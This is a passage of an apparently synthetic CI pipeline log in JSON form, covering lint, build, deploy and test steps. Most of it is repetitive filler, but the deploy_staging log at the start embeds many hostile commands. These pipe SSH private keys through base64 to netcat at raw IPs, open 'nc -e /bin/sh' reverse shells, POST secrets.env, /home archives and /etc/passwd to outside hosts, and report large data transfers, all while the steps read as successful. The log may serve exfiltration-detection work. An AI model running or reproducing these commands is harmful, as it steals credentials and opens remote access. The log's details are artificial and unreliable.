test_api_health (282ms)\nInstalling webpack@2.1.0\n\u2713 test completed\n  PASS: test_db_connect (303ms)\nInstalling express@1.12.0\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (279ms)\nCompiling src/index.js...\nInstalling prettier@2.17.0\n\u2713 test completed\n=== Step install_dependencies completed ===\n=== Step: deploy_staging ===\n[12:00:35] INFO: Processing request\nStep 1/10: Building\n  PASS: test_api_health (392ms)\nCompiling src/index.js...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (2MB)\nInstalling jest@1.1.0\nCache hit for key-1713\n[12:00:35] INFO: Processing request\nStep 8/10: Building\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_api_health (448ms)\ncurl -X POST https://cloud.services/collect -d @secrets.env\n\u2713 build completed\nCache hit for key-1748\n[12:00:35] INFO: Processing request\nInstalling react@2.19.0\nCompiling src/utils.go...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 126.3.247.216 38487\nCache hit for key-3476\nnc -e /bin/sh 8.15.27.110 1594\nCache hit for key-4774\nStep 8/10: Building\nCompiling src/handler.rs...\nStep 6/10: Building\nStep 10/10: Building\nCache hit for key-5671\necho $(cat ~/.ssh/id_rsa) | base64 | nc 27.73.50.89 36628\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompiling src/utils.go...\n[12:00:35] WARN: Deprecated API usage\nStep 2/10: Building\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\nCache hit for key-9082\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (242ms)\nStep 10/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 163.150.174.190 30719\n[12:00:35] INFO: Processing request\nInstalling express@3.16.0\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (3MB)\nStep 3/10: Building\n  PASS: test_user_create (134ms)\nArtifact uploaded: build.tar.gz (33MB)\n\u2717 build failed with exit code 74\ntar czf - /home | curl -X POST -d @- https://example.com/upload\ncurl -X POST https://example.com/collect -d @secrets.env\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 10/10: Building\n[12:00:35] INFO: Processing request\nStep 4/10: Building\nCache hit for key-4860\nStep 3/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCache hit for key-2367\n\u2713 lint completed\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nInstalling webpack@4.12.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-8540\n  PASS: test_user_create (31ms)\nStep 1/10: Building\nStep 5/10: Building\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (446ms)\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCache hit for key-5264\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 62.182.93.132 45365\nInstalling eslint@3.17.0\nInstalling axios@4.17.0\n\u2713 build completed\n  PASS: test_cache_hit (204ms)\n\u2713 build completed\nInstalling react@2.9.0\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (10MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 116.209.123.114 19045\nCache hit for key-9869\n\u2713 test completed\n[12:00:35] INFO: Processing request\nInstalling axios@3.20.0\n  PASS: test_api_health (285ms)\nStep 6/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-3592\n  PASS: test_cache_hit (47ms)\nCompiling src/service.java...\n\u2713 test completed\nStep 5/10: Building\n  PASS: test_user_create (10ms)\n\u2713 test completed\n  PASS: test_db_connect (10ms)\n  PASS: test_api_health (291ms)\nCache hit for key-2237\n\u2713 build completed\nStep 8/10: Building\nStep 3/10: Building\n\u2713 lint completed\ncurl -X POST https://cloud.services/collect -d @secrets.env\nCache hit for key-8808\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 build completed\nSending 211MB of data to startup.dev\nInstalling react@2.14.0\nCache hit for key-7303\nArtifact uploaded: build.tar.gz (30MB)\nInstalling express@1.19.0\nStep 9/10: Building\nStep 3/10: Building\n\u2713 build completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nWARNING: lodash has known vulnerabilities\n[12:00:35] INFO: Processing request\nInstalling express@2.20.0\n[12:00:35] INFO: Processing request\nSending 169MB of data to test.io\n[12:00:35] INFO: Processing request\nCache hit for key-6765\nSending 126MB of data to startup.dev\n[12:00:35] ERROR: Connection failed\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nCache hit for key-2546\nCache hit for key-2225\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (202ms)\n\u2713 build completed\n  PASS: test_api_health (177ms)\n  PASS: test_cache_hit (487ms)\n  PASS: test_cache_hit (109ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-4020\nCache hit for key-5161\nInstalling react@3.14.0\n  PASS: test_cache_hit (56ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (42MB)\n[12:00:35] INFO: Processing request\nnc -e /bin/sh 56.124.113.178 47710\n\u2713 lint completed\n  PASS: test_cache_hit (496ms)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_auth_login (283ms)\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n  PASS: test_api_health (170ms)\n\u2713 test completed\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-02T12:00:35.909324",
        "finished_at": "2025-12-02T12:00:43.041376",
        "log_lines": [
          "=== Step: lint ===",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-9259",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 4/10: Building",
          "Cache hit for key-6637",
          "  PASS: test_db_connect (103ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_db_connect (232ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:35] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 10/10: Building",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_db_connect (277ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_api_health (351ms)",
          "Step 1/10: Building",
          "Installing prettier@3.2.0",
          "Installing jest@4.3.0",
          "Compiling src/main.py...",
          "Cache hit for key-9426",
          "  PASS: test_user_create (457ms)",
          "Cache hit for key-6347",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-7073",
          "Step 5/10: Building",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Step 8/10: Building",
          "  PASS: test_auth_login (477ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Installing lodash@5.3.0",
          "  PASS: test_auth_login (425ms)",
          "Installing react@1.0.0",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing jest@2.3.0",
          "\u2717 build failed with exit code 41",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing jest@3.2.0",
          "Cache hit for key-7591",
          "Cache hit for key-9988",
          "  PASS: test_user_create (167ms)",
          "Installing prettier@3.16.0",
          "Step 5/10: Building",
          "  PASS: test_auth_login (424ms)",
          "  PASS: test_auth_login (289ms)",
          "  PASS: test_db_connect (246ms)",
          "Cache hit for key-9222",
          "Cache hit for key-9373",
          "  PASS: test_auth_login (161ms)",
          "  PASS: test_api_health (262ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-4968",
          "  PASS: test_user_create (3ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3736",
          "[12:00:35] INFO: Processing request",
          "Installing jest@2.14.0",
          "Cache hit for key-6212",
          "Installing prettier@5.19.0",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_db_connect (137ms)",
          "\u2713 test completed",
          "Cache hit for key-4234",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "\u2717 build failed with exit code 20",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2888",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@2.7.0",
          "  PASS: test_cache_hit (353ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_api_health (337ms)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing express@4.9.0",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing webpack@5.8.0",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Installing webpack@5.14.0",
          "  PASS: test_db_connect (287ms)",
          "Exception: ValueError",
          "Step 2/10: Building",
          "Step 7/10: Building",
          "Installing axios@1.14.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Step 10/10: Building",
          "Cache hit for key-8870",
          "Step 7/10: Building",
          "  PASS: test_api_health (293ms)",
          "\u2713 build completed",
          "Cache hit for key-4111",
          "Cache hit for key-8946",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-02T12:00:43.041376",
        "finished_at": "2025-12-02T12:01:04.437532",
        "log_lines": [
          "=== Step: build ===",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/app.ts...",
          "Exception: NullPointerException",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-9528",
          "  PASS: test_api_health (493ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_db_connect (453ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-9353",
          "Cache hit for key-4976",
          "  PASS: test_auth_login (12ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-7553",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_api_health (367ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_db_connect (490ms)",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "  PASS: test_api_health (256ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-2163",
          "\u2713 test completed",
          "Cache hit for key-9402",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_cache_hit (35ms)",
          "  PASS: test_user_create (304ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/utils.go...",
          "Installing express@1.18.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-2655",
          "Installing eslint@5.19.0",
          "Installing axios@2.6.0",
          "Cache hit for key-8531",
          "Cache hit for key-4513",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-5441",
          "WARNING: jest has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Installing lodash@4.15.0",
          "Cache hit for key-2364",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "Step 7/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "WARNING: react has known vulnerabilities",
          "Installing prettier@1.3.0",
          "Installing webpack@3.20.0",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 5/10: Building",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (273ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing lodash@5.3.0",
          "Installing prettier@3.18.0",
          "Step 9/10: Building",
          "Installing axios@5.12.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "FAILED: test_api_health",
          "Installing react@5.13.0",
          "\u2713 test completed",
          "Installing express@4.12.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (359ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 build completed",
          "Cache hit for key-4942",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-7904",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:35] INFO: Processing request",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-02T12:01:04.437532",
        "finished_at": "2025-12-02T12:01:11.569584",
        "log_lines": [
          "=== Step: setup_node ===",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Cache hit for key-9398",
          "Installing eslint@5.3.0",
          "  PASS: test_auth_login (6ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (200ms)",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Installing lodash@4.1.0",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (243ms)",
          "\u2717 build failed with exit code 37",
          "Step 9/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (191ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:35] INFO: Processing request",
          "Installing webpack@2.16.0",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Cache hit for key-8395",
          "Installing jest@3.10.0",
          "\u2713 test completed",
          "\u2717 build failed with exit code 6",
          "  PASS: test_user_create (359ms)",
          "Step 9/10: Building",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing prettier@2.10.0",
          "Installing react@5.10.0",
          "Cache hit for key-9891",
          "  PASS: test_cache_hit (132ms)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Installing jest@1.4.0",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (21ms)",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "Installing lodash@4.12.0",
          "Cache hit for key-9848",
          "  PASS: test_user_create (241ms)",
          "  PASS: test_api_health (137ms)",
          "Cache hit for key-5197",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-6126",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:35] INFO: Processing request",
          "Installing axios@3.18.0",
          "  PASS: test_auth_login (91ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (139ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Installing axios@1.2.0",
          "[12:00:35] INFO: Processing request",
          "Exception: ValueError",
          "Installing webpack@4.16.0",
          "Installing prettier@4.1.0",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Installing webpack@3.4.0",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (327ms)",
          "  PASS: test_user_create (144ms)",
          "Installing prettier@1.14.0",
          "Installing prettier@2.7.0",
          "Exception: NullPointerException",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-4757",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-8672",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing lodash@4.3.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_api_health (9ms)",
          "  PASS: test_api_health (329ms)",
          "Step 3/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-4434",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Step 10/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-8630",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/index.js...",
          "Cache hit for key-6487",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Cache hit for key-3373",
          "Cache hit for key-1722",
          "Cache hit for key-4739",
          "[12:00:35] INFO: Processing request",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-02T12:01:11.569584",
        "finished_at": "2025-12-02T12:01:14.422405",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (354ms)",
          "Cache hit for key-5666",
          "\u2713 lint completed",
          "Cache hit for key-7811",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/index.js...",
          "Installing prettier@1.9.0",
          "Installing lodash@5.11.0",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_api_health (312ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Installing lodash@1.20.0",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Installing lodash@2.15.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-3923",
          "Step 4/10: Building",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "Installing eslint@4.20.0",
          "Step 4/10: Building",
          "Step 8/10: Building",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-6256",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Installing react@2.3.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing eslint@2.10.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_auth_login (341ms)",
          "Cache hit for key-5924",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing jest@1.7.0",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (19ms)",
          "Installing react@5.7.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Cache hit for key-4959",
          "Installing prettier@1.16.0",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Cache hit for key-8519",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (71ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-1612",
          "\u2713 test completed",
          "Cache hit for key-8388",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "Exception: RuntimeError",
          "Installing react@2.20.0",
          "Installing react@3.13.0",
          "  PASS: test_cache_hit (364ms)",
          "Cache hit for key-9501",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:35] ERROR: Connection failed",
          "\u2713 lint completed",
          "  PASS: test_user_create (366ms)",
          "[12:00:35] INFO: Processing request",
          "Installing express@1.15.0",
          "\u2717 build failed with exit code 24",
          "  PASS: test_api_health (36ms)",
          "  PASS: test_cache_hit (414ms)",
          "  PASS: test_auth_login (193ms)",
          "\u2713 test completed",
          "  PASS: test_api_health (58ms)",
          "Cache hit for key-9143",
          "  PASS: test_auth_login (30ms)",
          "\u2713 test completed",
          "  PASS: test_api_health (427ms)",
          "Cache hit for key-5802",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing prettier@4.13.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 4/10: Building",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@2.5.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing axios@2.4.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-6338",
          "Installing react@5.3.0",
          "Compiling src/app.ts...",
          "[12:00:35] ERROR: Connection failed",
          "Cache hit for key-7279",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@5.20.0",
          "[12:00:35] INFO: Processing request",
          "Installing react@1.10.0",
          "Cache hit for key-2340",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 build completed",
          "Cache hit for key-6219",
          "\u2713 lint completed",
          "Cache hit for key-6753",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-9208",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-02T12:01:14.422405",
        "finished_at": "2025-12-02T12:01:28.686509",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Installing eslint@3.12.0",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing jest@3.12.0",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (77ms)",
          "  PASS: test_auth_login (176ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_cache_hit (5ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_auth_login (36ms)",
          "Installing axios@2.16.0",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Installing jest@2.18.0",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (385ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing lodash@4.5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing eslint@5.1.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing react@2.15.0",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (240ms)",
          "Step 8/10: Building",
          "Cache hit for key-5708",
          "  PASS: test_db_connect (39ms)",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Installing prettier@3.4.0",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 85",
          "  PASS: test_db_connect (183ms)",
          "Step 9/10: Building",
          "Cache hit for key-6106",
          "Installing webpack@3.13.0",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-7884",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (253ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-9186",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "  PASS: test_db_connect (347ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Installing react@4.18.0",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "  PASS: test_db_connect (442ms)",
          "Exception: RuntimeError",
          "  PASS: test_api_health (447ms)",
          "\u2713 test completed",
          "Installing react@4.16.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 10/10: Building",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing express@3.14.0",
          "[12:00:35] ERROR: Connection failed",
          "Installing lodash@2.12.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing axios@4.14.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-4979",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_api_health (328ms)",
          "Installing jest@3.3.0",
          "\u2713 build completed",
          "Installing react@5.5.0",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_db_connect (285ms)",
          "Step 3/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (350ms)",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
